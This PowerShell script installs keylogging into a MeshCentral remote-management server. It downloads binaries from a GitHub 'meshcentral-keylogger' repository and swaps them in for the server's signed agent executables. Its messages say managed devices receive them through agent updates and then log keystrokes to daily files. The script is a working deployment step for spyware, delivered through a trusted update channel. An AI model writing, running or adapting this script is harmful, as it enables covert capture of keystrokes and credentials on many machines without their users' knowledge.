param(
    [string]$MeshCentralRoot = 'C:\Program Files\Open Source\MeshCentral',
    [string]$ServiceName = 'meshcentral.exe'
)

$ErrorActionPreference = 'Stop'

$data = Join-Path $MeshCentralRoot 'meshcentral-data'
$signed = Join-Path $data 'signedagents'

$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = [Security.Principal.WindowsPrincipal]::new($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    throw 'Open PowerShell with Run as administrator, then run this installer again.'
}
if (-not (Test-Path -LiteralPath $data)) { throw "MeshCentral data folder not found: $data" }

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$work = Join-Path ([IO.Path]::GetTempPath()) ('mckeylog-agent-' + $stamp)
$archive = Join-Path $work 'meshcentral-keylogger.zip'
$sourceRoot = Join-Path $work 'meshcentral-keylogger-main'
$backup = Join-Path (Join-Path $data 'mckeylog-agent-backups') $stamp
$serviceWasRunning = $false
New-Item -ItemType Directory -Force -Path $work, $backup, $signed | Out-Null

try {
    Write-Output 'Downloading the current MeshCentral Keylogger project from GitHub...'
    Invoke-WebRequest -Uri 'https://github.com/og-debug447/meshcentral-keylogger/archive/refs/heads/main.zip' -OutFile $archive
    Expand-Archive -LiteralPath $archive -DestinationPath $work -Force

    $binaries = @(
        @{ Source = (Join-Path $sourceRoot 'binaries\MeshService.exe'); Destination = 'MeshService.exe' },
        @{ Source = (Join-Path $sourceRoot 'binaries\MeshService64.exe'); Destination = 'MeshService64.exe' }
    )
    foreach ($binary in $binaries) {
        if (-not (Test-Path -LiteralPath $binary.Source)) { throw "Keylogger binary not found in the project: $($binary.Source)" }
    }

    $service = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
    if ($null -ne $service -and $service.Status -ne 'Stopped') {
        Write-Output "Stopping $ServiceName while the signed agent cache is updated..."
        Stop-Service -Name $ServiceName -Force
        (Get-Service -Name $ServiceName).WaitForStatus('Stopped', [TimeSpan]::FromSeconds(45))
        $serviceWasRunning = $true
    }

    # Back up the current signed agents, then replace x86/x64 only.
    # MeshServiceARM64.exe and any other user-placed agents are left alone.
    $existing = Get-ChildItem -LiteralPath $signed -Filter 'MeshService*.exe' -ErrorAction SilentlyContinue
    foreach ($file in $existing) {
        Copy-Item -LiteralPath $file.FullName -Destination (Join-Path $backup $file.Name)
    }
    foreach ($binary in $binaries) {
        Copy-Item -LiteralPath $binary.Source -Destination (Join-Path $signed $binary.Destination) -Force
        Write-Output "Published $(Join-Path $signed $binary.Destination)"
    }

    if ($null -ne $service) {
        Write-Output "Starting $ServiceName..."
        Start-Service -Name $ServiceName
        (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
    }
    Write-Output 'Keylogger-enabled agent binaries published to the signed agent cache.'
    Write-Output 'Next, on each managed device: PC Control -> agent menu -> "Agent Update" or reinstall the agent from the console.'
    Write-Output 'The agent logs keystrokes to keylog-YYYY-MM-DD.log next to its own executable (10 MB rolling files).'
    Write-Output "Backup: $backup"
} catch {
    Write-Output "Installation failed. The previous signed agents are backed up at $backup"
    if ($serviceWasRunning) {
        try {
            $currentService = Get-Service -Name $ServiceName -ErrorAction SilentlyContinue
            if ($null -ne $currentService -and $currentService.Status -eq 'Stopped') {
                Start-Service -Name $ServiceName
                (Get-Service -Name $ServiceName).WaitForStatus('Running', [TimeSpan]::FromSeconds(45))
            }
        } catch { Write-Output "MeshCentral service recovery failed: $($_.Exception.Message)" }
    }
    throw
}
